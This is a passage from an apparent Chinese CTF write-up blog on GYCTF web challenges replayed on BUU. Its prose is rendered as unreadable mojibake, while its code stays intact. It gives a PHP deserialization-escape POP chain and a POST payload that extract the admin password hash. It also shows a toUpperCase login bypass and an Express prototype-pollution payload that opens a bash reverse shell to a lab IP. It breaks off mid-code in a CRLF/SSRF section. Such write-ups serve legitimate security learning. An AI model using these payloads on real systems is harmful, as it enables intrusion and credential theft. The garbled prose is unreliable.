<span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ï¼Œååºåˆ—åŒ–çš„æ˜¯<code>getNewinfo()</code>æ–¹æ³•è·å–çš„å†…å®¹ï¼Œå†æ¥çœ‹ä¸€ä¸‹<code>getNewinfo()</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹<code>Info</code>ç±»çš„å†…å®¹åºåˆ—åŒ–ä¹‹åï¼Œä¼šå…ˆç»è¿‡å‰é¢æåˆ°çš„<code>safe()</code>å‡½æ•°å¤„ç†ï¼Œç„¶åæ‰è¿›è¡Œååºåˆ—åŒ–ã€‚<br>è¿™é‡Œå°±æ˜¯æ„é€ ååºåˆ—åŒ–é€ƒé€¸çš„åœ°æ–¹ï¼šé€šè¿‡å†™å…¥é»‘åå•ä¸­çš„å­—ç¬¦\å­—ç¬¦ä¸²ï¼Œåœ¨ç»è¿‡<code>safe()</code>å‡½æ•°å¤„ç†çš„æ—¶å€™ä¼šæ›¿æ¢ä¸º<code>hacker</code>ï¼Œä»è€Œæ”¹å˜äº†é•¿åº¦ï¼Œä½†æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæ¯ä¸€ä¸ªå±æ€§çš„å†…å®¹é•¿åº¦éƒ½æ˜¯å›ºå®šçš„ï¼Œä»è€Œå°±å¯ä»¥åˆ©ç”¨æ›¿æ¢å…³ç³»æ„é€ å‡ºé€ƒé€¸ï¼Œç„¶åæ³¨å…¥å¯¹è±¡ã€‚</p>
<p>æ•´ç†ä¸€ä¸‹æ„é€ popé“¾çš„æ€è·¯ï¼š</p>
<blockquote>
<p>åˆ©ç”¨<code>UpdateHelper</code>çš„<code>__destruct</code>è§¦å‘<code>User</code>çš„<code>__toString</code>ç„¶åèµ°åˆ°<code>Info</code>çš„<code>__call</code>æ–¹æ³•ï¼Œåœ¨<code>__call</code>ä¸­è°ƒç”¨äº†<code>dbCtrl</code>ç±»çš„<code>login</code>æ–¹æ³•ï¼Œé€šè¿‡æ§åˆ¶æŸ¥è¯¢è¯­å¥ï¼ŒæŠŠ<code>admin</code>è´¦æˆ·çš„å¯†ç æŸ¥å‡ºæ¥ã€‚</p>
</blockquote>
<p>å®˜æ–¹POCå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">'admin'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Info(<span class="string">''</span>,<span class="string">'1'</span>);</span><br><span class="line">$b-&gt;CtrlCase=$d;</span><br><span class="line">$a = <span class="keyword">new</span> user();</span><br><span class="line">$a-&gt;nickname=$b;</span><br><span class="line">$a-&gt;age=<span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">$c=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$c-&gt;sql=$a;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœå¦‚ä¸‹</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">12</span>:<span class="string">"UpdateHelper"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">7</span>:<span class="string">"newinfo"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"sql"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"User"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">45</span>:<span class="string">"select password,id from user where username=?"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">0</span>:<span class="string">""</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">1</span>:<span class="string">"1"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;<span class="string">O:</span><span class="number">6</span>:<span class="string">"dbCtrl"</span>:<span class="number">8</span>:&#123;<span class="string">s:</span><span class="number">8</span>:<span class="string">"hostname"</span>;<span class="string">s:</span><span class="number">9</span>:<span class="string">"127.0.0.1"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbuser"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbpass"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"database"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"test"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"password"</span>;N;<span class="string">s:</span><span class="number">6</span>:<span class="string">"mysqli"</span>;N;<span class="string">s:</span><span class="number">5</span>:<span class="string">"token"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çš„ç›®çš„æ˜¯é€ƒé€¸å­—ç¬¦ï¼Œå› æ­¤éœ€è¦ä¿è¯payloadè¿›å…¥ä¹‹åèƒ½ä¿è¯åºåˆ—åŒ–å­—ç¬¦ä¸²èƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ–ï¼Œæ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­çš„<code>age</code>å’Œ<code>nickname</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠpayloadå†™å…¥åˆ°<code>nickname</code>éƒ¨åˆ†ï¼Œç„¶åé€šè¿‡å°†payloadæŒ¤å‡ºå»è¿›è¡Œé€ƒé€¸ï¼Œç”±äºå±æ€§æ˜¯ä¸‰ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨<code>nickname</code>ä¸­å†™å…¥çš„payloadå‰é¢åŠ ä¸€ä¸ª<code>CtrlCase</code>çš„å±æ€§ï¼Œåœ¨æœ€ååŠ ä¸€ä¸ª<code>}</code>ï¼Œå¦‚æ­¤ä»¥æ¥ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šå¿½ç•¥åé¢çš„<code>CtrlCase</code>ï¼Œåˆæ­¥æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";s:0:"</span><span class="string">";s:8:"</span>nickname<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":8:&#123;s:8:"</span>hostname<span class="string">";s:9:"</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">";s:6:"</span>dbuse<span class="string">r";s:4:"</span>root<span class="string">";s:6:"</span>dbpass<span class="string">";s:4:"</span>root<span class="string">";s:8:"</span>database<span class="string">";s:4:"</span>test<span class="string">";s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";N;s:6:"</span>mysqli<span class="string">";N;s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹ä¸€æ­¥æˆ‘ä»¬å°±éœ€è¦æŠŠpayloadé€ƒé€¸å‡ºå»ï¼šç”±äºpayloadä¸€å…±<code>454</code>ä¸ªå­—ç¬¦ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ é»‘åå•ä¸­çš„å†…å®¹ï¼Œé€šè¿‡æ›¿æ¢ä¸º<code>hacker</code>æŠŠpayloadæŒ¤å‡ºå»ï¼Œé€šè¿‡<code>safe()</code>å‡½æ•°æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¸€ä¸ª<code>&#39;</code>æ›¿æ¢ä¸º<code>hacker</code>å¯ä»¥æ›¿æ¢æŒ¤å‡º5ä¸ªå­—ç¬¦ï¼Œä¸€ä¸ª<code>union</code>æ›¿æ¢ä¸º<code>hacker</code>å¯ä»¥æŒ¤å‡º1ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨payloadå‰é¢åŠ ä¸Š90ä¸ª<code>&#39;</code>å’Œ4ä¸ª<code>union</code>å°±å¯ä»¥æŠŠ454ä¸ªå­—ç¬¦çš„payloadæŒ¤å‡ºå»äº†ï¼Œæ„é€ æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡POSTæ–¹å¼ï¼Œå°†payloadæ‰“å…¥<code>update.php</code>å³å¯æ‹¿åˆ°ç»è¿‡md5åŠ å¯†ä¹‹åçš„passwordï¼Œè§£å¯†å³å¯ã€‚<br>æœ¬é“é¢˜æ˜¯åœ¨BUUå¤ç°çš„ï¼Œå¯†ç å·²ç»è¢«æ”¹ä¸ºäº†<code>glzjin</code>äº†ï¼Œç™»å½•å³å¯æ‹¿flagã€‚</p>
<p>è¡¥å……ï¼šsmityå¸ˆå‚…ç»™äº†ä¸€ä¸ªå¾ˆè¯¦ç»†çš„é¢˜è§£ï¼Œå¯ä»¥å¥½å¥½å­¦å­¦è¿™é¢˜ï¼š<a href="https://www.anquanke.com/post/id/200200">è¿™é‡Œ</a>ã€‚</p>
<h2 id="Ez-Express"><a href="#Ez-Express" class="headerlink" title="Ez_Express"></a>Ez_Express</h2><p>è€ƒå¯ŸJSåŸå‹é“¾æ±¡æŸ“ï¼ŒJSä¹‹å‰æ²¡å­¦è¿‡ï¼Œåœ¨BUUä¸Šå¤ç°çš„è¿‡ç¨‹ä¸­æ…¢æ…¢å­¦äº†ä¸€äº›ï¼Œå…³äºJSåŸå‹é“¾çš„æ±¡æŸ“å‚è€ƒ<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">Pç¥çš„æ–‡ç« </a>ã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ-5"><a href="#é¢˜ç›®åˆ†æ-5" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼Œå¯ä»¥çœ‹åˆ°ä¸€äº›æç¤ºï¼š<br><img src="http://ggb0n.cool/images/gyctf5.png" alt=""></p>
<p>è¦æ±‚æˆ‘ä»¬å¿…é¡»ä»¥<code>ADMIN</code>ç™»å½•ï¼Œä½†æ˜¯è¿™ä¸ªç”¨æˆ·åˆæ³¨å†Œä¸äº†â€¦</p>
<p>dirsearchæ‰«åå°å¯ä»¥å‘ç°<a href="http://www.zipçš„å­˜åœ¨ï¼ŒæŠŠæºç æ‹¿ä¸‹æ¥ï¼Œçœ‹çœ‹å…¶ä¸­çš„ç„æœºã€‚">www.zipçš„å­˜åœ¨ï¼ŒæŠŠæºç æ‹¿ä¸‹æ¥ï¼Œçœ‹çœ‹å…¶ä¸­çš„ç„æœºã€‚</a></p>
<p>åœ¨<code>index.js</code>ä¸­çš„<code>login</code>è·¯ç”±ä¸‹å‘ç°çªç ´ç‚¹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™å­˜åœ¨<code>toUpperCase()</code>çš„ä½¿ç”¨ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´çš„ï¼Œå³åˆ©ç”¨ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç»•è¿‡ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toUpperCase():</span><br><span class="line">Ä± ==&gt; I</span><br><span class="line">Å¿ ==&gt; S</span><br></pre></td></tr></table></figure>

<p>å¦å¤–JSä¸­çš„<code>toLowerCase()</code>å‡½æ•°ä¹Ÿå­˜åœ¨å¯¹ç‰¹æ®Šå­—ç¬¦çš„ä¸è§„èŒƒå¤„ç†ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toLowerCase():</span><br><span class="line">Ä° ==&gt; i</span><br><span class="line">â„ª ==&gt; k</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å¦‚ä¸Šç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>admÄ±n</code>èº«ä»½è¿›è¡Œæ³¨å†Œï¼Œç»è¿‡<code>toUpperCase()</code>å¤„ç†ä¾¿æˆäº†<code>ADMIN</code>ä»è€ŒæˆåŠŸç™»å½•ï¼š<br><img src="http://ggb0n.cool/images/gyctf1.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæç¤ºäº†flagçš„ä½ç½®ï¼Œåº”è¯¥å°±éœ€è¦RCEæ¥è¿›è¡Œè¯»å–äº†ã€‚</p>
<p>å†å®¡ä»£ç ï¼Œå‘ç°<code>index.js</code>ä¸­å­˜åœ¨<code>merge</code>å’Œ<code>clone</code>ï¼Œæ ¹æ®åœ¨å‰é¢æåˆ°çš„Pç¥çš„æ–‡ç« ä¸­çš„å­¦ä¹ ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯JSåŸå‹é“¾æ±¡æŸ“ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿›ä¸€æ­¥åœ¨<code>action</code>è·¯ç”±ä¸‹å‘ç°äº†<code>clone</code>çš„ä½¿ç”¨ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>æ˜¯å°†<code>req</code>è¯·æ±‚ä¸­çš„å†…å®¹æ‹¼æ¥åˆ°<code>session</code>çš„è¿‡ç¨‹ï¼Œæ˜¾ç„¶ï¼Œ<code>req.body</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ˜¯è€ƒå¯ŸåŸå‹é“¾æ±¡æŸ“æ²¡é”™äº†ã€‚</p>
<p><code>action</code>è·¯ç”±æ˜¯å•¥æ—¶å€™è®¿é—®çš„å‘¢ï¼Ÿå…¶å®å°±æ˜¯æäº¤è¾“å…¥çš„åœ°æ–¹ï¼š<br><img src="http://ggb0n.cool/images/gyctf.png" alt=""></p>
<h3 id="è§£é¢˜-6"><a href="#è§£é¢˜-6" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ä½†æ˜¯æ€ä¹ˆæ‰èƒ½å®ç°åŸå‹é“¾çš„æ±¡æŸ“å‘¢ï¼Ÿçœ‹åˆ°<code>info</code>è·¯ç”±ä¸‹å‡ºç°äº†<code>outputFunctionName</code>ï¼Œå‚è€ƒå¦ä¸€ç¯‡<a href="https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/#xnuca-2019-hardjs-1">æ–‡ç« </a>ï¼Œè®²äº†åˆ©ç”¨<code>outputFunctionName</code>è¿›è¡Œæ±¡æŸ“çš„æ–¹å¼ï¼Œpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¤§è‡´å«ä¹‰å°±æ˜¯ï¼š</p>
<blockquote>
<p>åˆ©ç”¨å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼Œå‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code>ä¸­å†™å…¥ä¸€ä¸ªæ–°çš„å±æ€§å’Œå±æ€§å€¼ï¼Œå³<code>outputFunctionName</code>å’Œå¯¹åº”çš„å€¼ï¼Œå¦‚æ­¤ä»¥æ¥ï¼Œè¯¥ç±»å°±å­˜åœ¨äº†è¿™ä¸ªå±æ€§ï¼Œå®ä¾‹åŒ–çš„æ—¶å€™ä¹Ÿä¼šç»§æ‰¿ï¼Œå› æ­¤å½“æˆ‘ä»¬å†å»è®¿é—®<code>info</code>è·¯ç”±çš„æ—¶å€™<code>res.outputFunctionName</code>çš„å€¼å·²ç»æ˜¯æˆ‘ä»¬å†™å…¥çš„payloadä¸­çš„RCEéƒ¨åˆ†çš„å†…å®¹äº†ï¼Œä»è€Œå³å¯åœ¨VPSä¸Šåå¼¹shellã€‚</p>
</blockquote>
<p>ç”±äºæ˜¯åœ¨BUUä¸Šå¤ç°çš„ï¼Œå¼€ä¸€å°å†…ç½‘ä¸»æœºï¼Œæ‹¿åˆ°ipä¹‹åæ„é€ payloadï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/174.1.33.241/8899 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶åœ¨è¯¥å†…ç½‘ä¸»æœºä¸Šè¿›è¡Œç›‘å¬ï¼Œåœ¨è®¿é—®<code>action</code>è·¯ç”±çš„æ—¶å€™æŠ“åŒ…æ›´æ”¹<code>Content-Type</code>ä¸º<code>application/json</code>ï¼Œå¹¶å°†æˆ‘ä»¬å¦‚ä¸Šæ„é€ çš„payloadå†™å…¥ï¼š<br><img src="http://ggb0n.cool/images/gyctf2.png" alt=""></p>
<p>å‰é¢å°±æ±¡æŸ“äº†åŸå‹é“¾äº†ï¼Œç„¶åè®¿é—®<code>info</code>è·¯ç”±è¿›è¡Œå‘½ä»¤çš„æ‰§è¡Œï¼š<br><img src="http://ggb0n.cool/images/gyctf3.png" alt=""></p>
<p>ä»è€Œæ‹¿åˆ°shellï¼š<br><img src="http://ggb0n.cool/images/gyctf4.png" alt=""></p>
<p>ç„¶åå°±å¯ä»¥éšä¾¿è¯»å–æ–‡ä»¶ï¼Œæ‹¿åˆ°flagäº†ã€‚</p>
<p>æœ‰å…³JSçš„é¢˜ç›®å…¶å®æ²¡æ€ä¹ˆåšè¿‡ï¼Œå› ä¸ºè¿˜æ²¡æœ‰ä¸“é—¨å­¦è¿‡JSï¼Œä½†æ˜¯JSç¡®å®è¶Šæ¥ç”¨çš„è¶Šå¤šï¼Œé¢˜ä¹Ÿä¸å°‘ï¼Œå¾ˆæœ‰å­¦çš„å¿…è¦ã€‚</p>
<h2 id="Node-Game"><a href="#Node-Game" class="headerlink" title="Node Game"></a>Node Game</h2><p>åˆæ˜¯ä¸€é“JSçš„é¢˜ï¼Œè€ƒå¯Ÿ<code>CRLFæ³¨å…¥</code>ã€SSRF</p>
<p>CRLFæ³¨å…¥å‚è€ƒ<a href="https://www.cnblogs.com/uestc2007/p/10880338.html">è¿™é‡Œ</a>ï¼š</p>
<blockquote>
<p>CRLFæ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸ºWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥åˆç§°ä¸ºHTTPå“åº”æ‹†åˆ†æ¼æ´ï¼ˆHTTP Response Splittingï¼‰ã€‚</p>
</blockquote>
<h3 id="é¢˜ç›®åˆ†æ-6"><a href="#é¢˜ç›®åˆ†æ-6" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®å³å¯æ‹¿åˆ°æºç ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>); <span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span 